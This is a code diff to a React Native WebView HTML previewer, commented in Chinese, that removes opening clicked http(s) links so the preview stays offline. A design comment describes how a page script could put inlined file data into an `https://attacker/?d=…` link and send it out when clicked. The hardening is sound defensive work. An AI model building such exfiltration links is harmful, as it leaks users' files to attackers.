@@ -16,9 +16,9 @@
  * 页面(内联样式与脚本、`data:` 图、公网图)完整可读;多文件站点式产物会缺资源,退路
  * 是工具栏「分享」把文件送到电脑上看。桌面靠 `file://` 的同目录天然没有这个问题。
  *
- * 导航一律拦下:about: 放行(文档自身与页内锚点),**用户点击**的 http(s) 转系统浏览器,
- * 其余一切(程序化导航、`file://`、`tel:`、`mailto:`、自定义 scheme)明确拒绝且
- * **不交给 Linking**。
+ * 导航一律拦下:只有 `about:`(文档自身与页内锚点)放行,**其余一切明确拒绝,且不交给
+ * Linking** —— 包含用户主动点击的 http(s) 外链。这是一个**完全离线的预览沙箱**,没有任何
+ * 出网信道(理由见 interceptHtmlNavigation)。
  * 不挂 onMessage:页面里的 postMessage 无人消费,不给任意生成物开一条通向 RN 侧的通道。
  * Android 另关多窗口:`window.open` / `target="_blank"` 走的是 onCreateWindow,不经过下面
  * 的导航回调,不关掉等于给策略留一个后门(见 setSupportMultipleWindows 处的说明)。
@@ -29,7 +29,7 @@
  * 会拉起外部应用,把下面这段策略整个绕过去。放到 `['*']` 之后,回调是唯一决策点。
  */
 import { useMemo } from 'react';
-import { Linking, StyleSheet, View } from 'react-native';
+import { StyleSheet, View } from 'react-native';
 import { WebView } from 'react-native-webview';
 import type { ShouldStartLoadRequest } from 'react-native-webview/lib/WebViewTypes';
 
@@ -73,29 +73,35 @@ export function HtmlFileReader({ html, testID }: { html: string; testID?: string
 /**
  * 唯一的导航决策点(originWhitelist 已放到 `['*']`,所有请求都会先到这里)。
  *
- * 三档,默认拒绝:
+ * 两档,默认拒绝:
  *  - `about:` —— 文档自身(`source={{ baseUrl: 'about:blank' }}`)与页内锚点,放行;
- *  - **用户点击的** `http(s)` —— 不在预览 WebView 里导航走,交系统浏览器打开;
- *  - **其余一切** —— 拒绝,且**不调 Linking**:`file://` 在手机上指向 app 沙盒而非
- *    被控端,`tel:` / `mailto:` / `intent:` 等会拉起外部应用。生成物不该有这个能力。
+ *  - **其余一切** —— 拒绝,且**不调 Linking**(不 import 它,守卫用例钉住)。
  *
- * ⚠️ 为什么必须卡 `navigationType === 'click'`(review P1 实捉):HTML 与静态 markdown
- * 不同,这里 JavaScript 是开启的。`location.href = '…'`、表单自动提交、meta refresh
- * 同样会走进这个回调 —— 不区分的话,用户只要打开一份生成物就会被脚本强制带出 Cindy
- * 跳到任意网页(也是一条把页面内容带出去的信道)。
+ * ── 为什么连「用户点击的 http(s) 外链」也不放(review P1,曾经放过) ──────────
+ * 本预览会把被控电脑上的**同目录资源内联成 `data:` URI 塞进这个页面**,而页面里的
+ * JavaScript 是开启的(CSP 允许 `script-src 'unsafe-inline'`,不然自包含产物的交互全废)。
+ * 于是作者脚本可以读到那些 `data:` URI 的字节,拼进一个真实的
+ * `<a href="https://attacker/?d=…">`(甚至铺一层全屏透明覆盖层),用户随手一点就命中
+ * `navigationType === 'click'`——数据在用户看见浏览器之前就已经发出去了。
  *
- * Android 的取舍:RNW 的 Android 侧 `createWebViewEvent` 根本不设 `navigationType`
- * (只有 url / title / loading 等),所以那边**无法确认**是否用户点击 → 一律按拒绝处理。
- * 代价是 Android 上生成物里的外链点不开(可用工具栏「分享」把文件送到别处打开);
- * 方向与本文件其余判据一致:拿不准就不放行。
+ * **CSP 挡不住这条**:它管子资源与表单(`connect-src` / `img-src` / `form-action`),
+ * 顶层导航不在其控制范围内(`navigate-to` 指令已从 CSP3 移除,两端都不实现)。所以
+ * 「点击门」只能挡住程序化导航,挡不住脚本**构造出的、由用户点击触发**的 URL。
+ *
+ * 两条候选补救都不划算:
+ *  - **弹确认框**:要用户对着一条 2KB base64 的 URL 判断安全性,是安全剧场;
+ *  - **静态 href 白名单**(只放原文里字面存在的 URL):挡得住,但要引入 URL 归一化
+ *    (HTML 实体、百分号编码、尾斜杠),归一化对不上就变成「合法外链静默点不开」。
+ * 而这条能力**本来就只在 iOS 上存在** —— Android 侧 RNW 的 `createWebViewEvent` 根本不设
+ * `navigationType`,那边一直拿不准、一直是拒绝。删掉它是把两端对齐,不是砍掉一个统一功能。
+ *
+ * 与本 PR 已经接受的取舍也一致:CSP 让公网 https 图片 / 字体在预览里不加载,预览本就
+ * 是离线的;留一条点击外送信道反而是这套设计里唯一的破口。外链的退路是工具栏「分享」把
+ * 文件送到电脑或浏览器里打开,或切「源码」态自己看 URL。
  */
 function interceptHtmlNavigation(request: ShouldStartLoadRequest): boolean {
   const url = request.url ?? '';
   if (url === 'about:blank' || url.startsWith('about:')) return true;
-  if (/^https?:\/\//i.test(url) && request.navigationType === 'click') {
-    void Linking.openURL(url).catch(() => undefined);
-    return false;
-  }
   return false;
 }
 
